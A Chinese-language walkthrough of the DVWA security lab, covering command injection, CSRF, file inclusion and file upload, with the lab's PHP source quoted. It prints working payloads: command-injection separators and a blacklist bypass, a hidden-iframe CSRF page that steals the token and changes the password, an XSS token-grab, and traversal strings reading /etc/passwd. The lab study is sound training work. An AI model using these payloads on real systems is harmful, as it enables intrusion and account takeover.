+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Login&#x27; ] ) &amp;&amp; isset ($_POST[&#x27;username&#x27;]) &amp;&amp; isset ($_POST[&#x27;password&#x27;]) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Sanitise username input</span><br><span class="line">    $user = $_POST[ &#x27;username&#x27; ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Sanitise password input</span><br><span class="line">    $pass = $_POST[ &#x27;password&#x27; ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    // Default values</span><br><span class="line">    $total_failed_login = 3;</span><br><span class="line">    $lockout_time       = 15;</span><br><span class="line">    $account_locked     = false;</span><br><span class="line"></span><br><span class="line">    // Check the database (Check user information)</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    // Check to see if the user has been locked out.</span><br><span class="line">    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#x27;failed_login&#x27; ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        // User locked out.  Note, using this method would allow for user enumeration!</span><br><span class="line">        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Calculate when the user would be allowed to login again</span><br><span class="line">        $last_login = strtotime( $row[ &#x27;last_login&#x27; ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * 60);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        */</span><br><span class="line"></span><br><span class="line">        // Check to see if enough time has passed, if it hasn&#x27;t locked the account</span><br><span class="line">        if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = true;</span><br><span class="line">            // print &quot;The account is locked&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Check the database (if username matches the password)</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( &#x27;:password&#x27;, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    // If its a valid login...</span><br><span class="line">    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;</span><br><span class="line">        // Get users details</span><br><span class="line">        $avatar       = $row[ &#x27;avatar&#x27; ];</span><br><span class="line">        $failed_login = $row[ &#x27;failed_login&#x27; ];</span><br><span class="line">        $last_login   = $row[ &#x27;last_login&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Had the account been locked out since last login?</span><br><span class="line">        if( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;&#123;$last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Reset bad login count</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Login failed</span><br><span class="line">        sleep( rand( 2, 4 ) );</span><br><span class="line"></span><br><span class="line">        // Give the user some feedback</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Update bad login count</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Set the last login time</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>用POST方法传入参数，比较安全</p>
+<p>同样通过<code>checkToken</code>函数验证提交的表单中的<code>user_token</code>与会话中的<code>session_token</code>是否一致。这有助于防止跨站请求伪造攻击，代码在每次请求结束时通过<code>generateSessionToken</code>函数刷新CSRF令牌，以增强会话的安全性。</p>
+<p>同样，用户名和密码通过<code>stripslashes</code>和<code>mysqli_real_escape_string</code>进行处理，以避免SQL注入攻击。</p>
+<p>密码在存储前同样使用<code>md5</code>进行了散列处理。</p>
+
+        <h6 id="关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟"   >
+          <a href="#关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟" class="headerlink" title="关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟"></a>关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟</h6>
+      <p>如果账户之前曾被锁定（即有暴力破解的迹象），用户将收到警告信息。</p>
+
+        <h2 id="二、命令注入"   >
+          <a href="#二、命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、命令注入" class="headerlink" title="二、命令注入"></a>二、命令注入</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201441479.png" alt="image-20240520144137454"></p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A;B</td>
+<td>A 不论正确与否都会执行 B 命令</td>
+</tr>
+<tr>
+<td>A&amp;B</td>
+<td>A 后台运行，A 和 B 同时执行</td>
+</tr>
+<tr>
+<td>A&amp;&amp;B</td>
+<td>A 执行成功时候才会执行 B 命令</td>
+</tr>
+<tr>
+<td>A|B</td>
+<td>A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</td>
+</tr>
+<tr>
+<td>A||B</td>
+<td>A 执行失败后才会执行 B 命令</td>
+</tr>
+</tbody></table></div>
+
+        <h2 id="Low-1"   >
+          <a href="#Low-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2>
+      <p>即使不是IP地址也不会报错，可以输入一些简单的命令，比如</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;dir</span><br></pre></td></tr></table></div></figure>
+
+<p>（加分号是让系统忽略之前的任何内容（如果有的话），并执行一个新的<code>dir</code>命令。）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450526.png" alt="image-20240520145022497"></p>
+<p>输入|ehco “ls”</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201502820.png" alt="image-20240520150201793"></p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450722.png" alt="image-20240520145047683"></p>
+<p>对输入没有进行验证</p>
+<p>而且使用<code>php_uname(&#39;s&#39;)</code>获取当前服务器的操作系统名称，如果返回的字符串包含”Windows NT”（即使用的是Windows系统，执行ping命令），所以在Windows系统下查看文件目录命令应该是dir</p>
+
+        <h2 id="Medium-1"   >
+          <a href="#Medium-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>此时输入;dir没有返回信息，但是输入|dir能正常输出，说明是把“;”过滤了</p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201504764.png" alt="image-20240520150403738"></p>
+<p>有设置黑名单，过滤了“&amp;&amp;”和“;”，用其他符号比如&amp;、|、||代替即可</p>
+
+        <h2 id="High-1"   >
+          <a href="#High-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-1" class="headerlink" title="High"></a>High</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201505236.png" alt="image-20240520150542198"></p>
+<p>对输入进行了更多的过滤，但是仔细看能发现第三个是过滤了| ，在管道符后面不加空格就能绕过</p>
+
+        <h2 id="Impossible-1"   >
+          <a href="#Impossible-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>通过 <code>checkToken</code> 函数检查请求中的 CSRF 令牌与会话中的令牌是否匹配，以防止 CSRF 攻击。</p>
+<p>获取用户输入的 IP 地址，并使用 <code>stripslashes</code> 函数去除可能的转义字符。</p>
+<p>验证IP地址，被分割为四个部分（四个八位组），并检查每个部分是否为数字，并且确保只有四个八位组。</p>
+
+        <h1 id="三、CSRF"   >
+          <a href="#三、CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CSRF" class="headerlink" title="三、CSRF"></a>三、CSRF</h1>
+      
+        <h2 id="Low-2"   >
+          <a href="#Low-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201519277.png" alt="image-20240520151939239"></p>
+<p>只要登录之后，输入改后的密码两次就能改掉密码，密码修改后能看到URL已经改变为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></div></figure>
+
+<p>因此只要让用户访问这个网址就可以把用户的密码成功修改</p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201523319.png" alt="image-20240520152343277"></p>
+<p>使用GET方法传参，很容易被篡改，而且只是验证了两个新密码是否一致</p>
+
+        <h2 id="Medium-2"   >
+          <a href="#Medium-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201526098.png" alt="image-20240520152601070"></p>
+<p>多加了一个验证，检查 HTTP 请求的来源（Referer）是否包含当前服务器的域名，常用于确定请求是否来自同一个网站</p>
+<p>假如把修改后的URL复制到另一个网页，会显示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542994.png" alt="image-20240520154252963"></p>
+<p>在Repeater中添加Referer字段</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542105.png" alt="image-20240520154228070"></p>
+<p>发送后密码成功修改</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201541804.png" alt="image-20240520154119768"></p>
+
+        <h2 id="High-2"   >
+          <a href="#High-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-2" class="headerlink" title="High"></a>High</h2>
+      <p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261023149.png" alt="image-20240526102255008"></p>
+<p>使用 <code>checkToken</code> 函数验证 token，这样 CSRF 攻击的时候必须知道用户的 token 才可以成功，可以通过使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中，就可以完成修改密码的操作</p>
+<p>可以去构造一个攻击脚本，脚本的作用就是获取用户token然后修改密码，将其放置在存储型XSS中，只要用户点击存储型XSS页面，就会完成CSRF攻击，即修改密码，下面是代码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function attack()&#123;</span><br><span class="line">        document.getElementsByName(&#x27;user_token&#x27;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#x27;user_token&#x27;)[0].value;</span><br><span class="line">        document.getElementById(&quot;transfer&quot;).submit(); </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line">    &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token)</p>
+<p>将这段脚本赋给txtName变量</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27;user_token&#x27;)[0].value)&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>就可以获取到用户token</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261044928.png" alt="image-20240526104420862"></p>
+
+        <h2 id="Impossible-2"   >
+          <a href="#Impossible-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261111981.png" alt="image-20240526111144899"></p>
+<p>对于 High 级别主要就是增加了输入当前密码的选项</p>
+
+        <h1 id="四、文件包含"   >
+          <a href="#四、文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、文件包含" class="headerlink" title="四、文件包含"></a>四、文件包含</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210853201.png" alt="image-20240521085315103"></p>
+<p>三个文件，依次点进去</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854330.png" alt="image-20240521085434286"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854374.png" alt="image-20240521085451335"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210855753.png" alt="image-20240521085505715"></p>
+<p>URL都会有相应改变</p>
+
+        <h2 id="Low-3"   >
+          <a href="#Low-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2>
+      <p>先在文件上传漏洞处上传一个写有phpinfo()的文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210913327.png" alt="image-20240521091302289"></p>
+<p>再回到文件上传漏洞，将路径粘贴到参数page中</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210914641.png" alt="image-20240521091440586"></p>
+<p>文件成功执行</p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210916324.png" alt="image-20240521091605288"></p>
+<p>没有任何过滤</p>
+
+        <h2 id="Medium-3"   >
+          <a href="#Medium-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210918327.png" alt="image-20240521091815300"></p>
+<p>过滤了字符串 <code>$file</code> 中的 <code>http://</code> , <code>https://</code>和路径中的 <code>../</code>（Unix/Linux 系统）和 <code>..\\</code>（Windows 系统）,如果有识别到这些字符则替换成空白字符</p>
+<p>绕过方式：①双写②使用绝对路径</p>
+
+        <h3 id="双写"   >
+          <a href="#双写" class="heading-link"><i class="fas fa-link"></i></a><a href="#双写" class="headerlink" title="双写"></a>双写</h3>
+      <p>在文件上传处上传phpinfo()文件（但是Medium难度下只能上传图片，所以把后缀改成jpg）</p>
+<p>上传成功后构造payload：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=..././..././hackable/uploads/info.jpg</span><br></pre></td></tr></table></div></figure>
+
+<p>实际识别到的还是</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../hackable/uploads/info.jpg</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210944172.png" alt="image-20240521094452130"></p>
+
+        <h3 id="使用绝对路径"   >
+          <a href="#使用绝对路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用绝对路径" class="headerlink" title="使用绝对路径"></a>使用绝对路径</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/passwd</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139550.png" alt="image-20240521213902434"></p>
+
+        <h2 id="High-3"   >
+          <a href="#High-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-3" class="headerlink" title="High"></a>High</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211008555.png" alt="image-20240521100836525"></p>
+<p><code>fnmatch(&quot;file*&quot;, $file)</code>：这个函数用于比较 <code>$file</code> 变量是否匹配模式 <code>&quot;file*&quot;</code>。这里的模式 <code>&quot;file*&quot;</code> 表示任何以 “file” 开头的字符串都应该匹配。如果 <code>$file</code> 符合这个模式，<code>fnmatch</code> 函数返回 <code>true</code>。此外，还检查 <code>$file</code> 是否不等于 <code>&quot;include.php&quot;</code>。</p>
+<p>所以传入的参数中必须以file为开头</p>
+<p>可以想到用file://伪协议</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:///etc/passwd</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139342.png" alt="image-20240521213956283"></p>
+
+        <h2 id="Impossible-3"   >
+          <a href="#Impossible-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231105935.png" alt="image-20240523110512896"></p>
+<p>只允许包含include.php,file1.php,file2.php,file3.php的文件</p>
+
+        <h1 id="五、文件上传"   >
+          <a href="#五、文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、文件上传" class="headerlink" title="五、文件上传"></a>五、文件上传</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211015259.png" alt="image-20240521101511230"></p>
+
+        <h2 id="Low-4"   >
+          <a href="#Low-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2>
+      <p>可以选择一个任意格式的文件上传，比如文件包含中Low难度的文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211017425.png" alt="image-20240521101715390"></p>
+<p>成功上传</p>
+<p>复制路径访问<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/hackable/uploads/info.php" >http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/info.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
